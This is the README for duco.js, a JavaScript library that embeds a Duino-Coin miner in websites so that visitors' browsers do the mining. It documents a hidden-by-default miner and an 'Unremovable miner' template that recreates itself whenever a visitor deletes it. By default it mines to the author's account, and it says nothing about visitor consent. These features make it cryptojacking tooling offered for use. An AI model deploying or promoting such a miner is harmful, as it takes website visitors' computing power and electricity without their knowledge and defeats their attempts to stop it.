# `duco.js`
Easily implement a duino coin miner to your website

duco.js is a JavaScript library that allows you to create a duino coin miner for your website.

## Installation
#### **With npm**
```bash
npm i duco
```
#### **Via CDN**

unpkg
```js
import { Duco } from 'https://www.unpkg.com/duco';
```
jsdelivr
```js
import { Duco } from 'https://cdn.jsdelivr.net/npm/duco';
```

## Usage
### **Basics**

#### **Full code to create and start a miner**
```js
const miner = new Duco({
    username: 'axorax'
})

miner.start()
```

#### **Create a new miner**
```js
const miner = new Duco({
    username: 'axorax',
    threads: 1,
    rigid: 'duco-js-miner',
    key: 'mySecretKey',
    id: 'my-cool-miner'
})
```

threads, rigid, id and key are optional but username is required. If no username is provided, then the created miner will have username set to 'axorax' by default. This will make the miner mine for the user named axorax.

|   Type   | Argument |                      Description                       |
|----------|----------|--------------------------------------------------------|
| required | username | Person who the miner will mine for                     |
| optional | threads  | Amount of threads that should be used                  |
| optional | rigid    | Gives the miner an id that appears in your miner list  |
| optional | key      | Only needed if you have an active key                  |
| optional | id       | Gives the miner a HTML id tag                          |

<br> The default values are:

| Argument |      Default value     |
|----------|------------------------|
| username |        'axorax'        |
|  threads |            1           |
|   rigid  |        'duco.js'       |
|    key   |           ''           |
|    id    | \<randomly-generated\> |

<br> The bare minimum to create a miner is:

```js
const miner = new Duco({
    username: 'axorax'
})
```

#### **Set `threads` to maximum amount a user has**

We recommend not using this and just leaving threads to `1`.

```js
const miner = new Duco({
    username: 'axorax',
    threads: 'hardwareConcurrency'
})
```

#### **Start miner**
```js
miner.start()
```

#### **Start miner after a certain time**
```js
miner.startAfter(5000)
```
The time must be passed in milliseconds. In the above example, it will start the miner after 5 seconds (5000ms = 5s)

#### **Stop miner**
```js
miner.stop()
```

#### **Stop miner after a certain time**
```js
miner.stopAfter(5000)
```

#### **Delete miner**
```js
miner.delete();
```

This will stop the miner. Unlike `miner.stop();` it will not update any variables. It will only stop the miner and won't update any variables like `miner.running` and `miner.stoppedTimestamp`

#### **Delete miner after a certain time**
```js
miner.deleteAfter(5000);
```

#### **Change already created miner**
```js
miner.change({
    username: 'changed_username',
    threads: 2,
    rigid: 'myCoolMiner',
    key: 'superSecret'
})
```

After changing the miner, it will not start automatically.

#### **Change miner and start automatically**
```js
miner.change({
    username: 'changed_username',
    threads: 2,
    rigid: 'myCoolMiner',
    key: 'superSecret',
    start: true
})
```

Set the value of `start` to true to make the miner start automatically after being changed.

#### **Change already created miner after a certain time**
```js
miner.changeAfter({
    username: 'changed_username',
    threads: 2,
    rigid: 'myCoolMiner',
    key: 'superSecret'
}, 5000)
```

This works similar to `miner.change()` but you need to also provide a time in milliseconds after the curly braces `{}`. In the given example, the miner will get changed after 5 seconds (5000ms = 5s)

#### **Do something if miner was removed**
```js
miner.onRemove(() => {
    console.log('Miner was removed!')
})
```

If the user removes the miner from the DOM by using inspect element, running JavaScript code or anything else then the code inside will be executed.

Alternative ways to use `miner.onRemove()`:

```js
miner.onRemove(removedFunction)

function removedFunction() {
    console.log('Removed Miner!')
}
```

```js
miner.onRemove(function() {
    console.log('Removed Miner!')
})
```

#### **Create new miner if miner is removed**
```js
miner.onRemoveCreateNew();
```

If the user removes the miner from the DOM then it will create a new miner with all the settings specified in the original miner before. If the user again removes the newly created miner then it will again create another miner.

You can use both `miner.onRemove();` and `miner.onRemoveCreateNew();` without any trouble. For example:

```js
miner.onRemoveCreateNew();

miner.onRemove(() => {
    console.log('Miner was removed!')
})
```

#### **Get values used in a miner**
```js
let minerUsername = miner.username;
let minerThreads = miner.threads;
let minerId = miner.id;
// you can get all values like that
```

#### **Get time when miner was created**
```js
miner.createdTimestamp
```

#### **Get time when miner was started**
```js
miner.startedTimestamp
```

#### **Get time when miner was stopped**
```js
miner.stoppedTimestamp
```

#### **Check if miner is running**
```js
miner.running
```

#### **Check if miner was changed**
```js
miner.changed
```

#### **Add custom CSS to miner**
```js
miner.addStyle(`
    display: block;
    width: 500px:
    height: 400px;
`)
```

## Templates
#### **Install and get started via CDN**

```html
<script type="module">
import { Duco } from 'https://www.unpkg.com/duco';

const miner = new Duco({
    username: 'axorax'
});

miner.start();
</script>
```

#### **Install and get started via CDN in another file**

If you want to use the library in another file then the code will be as follows:

```html
<script type="module" src="./script.js"></script>
```

```js
import { Duco } from 'https://www.unpkg.com/duco';

const miner = new Duco({
    username: 'axorax' 
});

miner.start();
```

#### **Install and get started with npm**

```bash
npm i duco
```

```js
import { Duco } from './node_modules/duco/index.js';

const miner = new Duco({
    username: 'axorax'
});

miner.start();
```

#### **Get dictionary of all values**

```js
const miner = new Duco({
    username: 'axorax'
});

const data = {
    username: miner.username,
    threads: miner.threads,
    rigid: miner.rigid,
    key: miner.key,
    id: miner.id,
    createdTimestamp: miner.createdTimestamp,
    startedTimestamp: miner.startedTimestamp,
    stoppedTimestamp: miner.stoppedTimestamp,
    running: miner.running,
    changed: miner.changed
};

console.log(data);
```

#### **Unremovable miner**

```js
const miner = new Duco({
    username: 'axorax'
});

miner.start();

miner.onRemoveCreateNew();
```

#### **Mine for only 10 seconds**

```js
const miner = new Duco({
    username: 'axorax'
});

miner.start();

miner.stopAfter(10000);
```

#### **Visible miner**

```js
const miner = new Duco({
    username: 'axorax'
});

miner.start();

miner.addStyle(`
    display: block;
    width: 500px;
    height: 600px;
`);
```

#### **Alert user about removed miner**
```js
const miner = new Duco({
    username: 'axorax'
});

miner.start();

miner.onRemove(() => {
    alert('Mining helps us to provide our awesome services! Maybe change your mind?')
});
```

---

[Support me on Patreon](https://www.patreon.com/axorax) - 
[Check out my socials](https://github.com/axorax/socials)
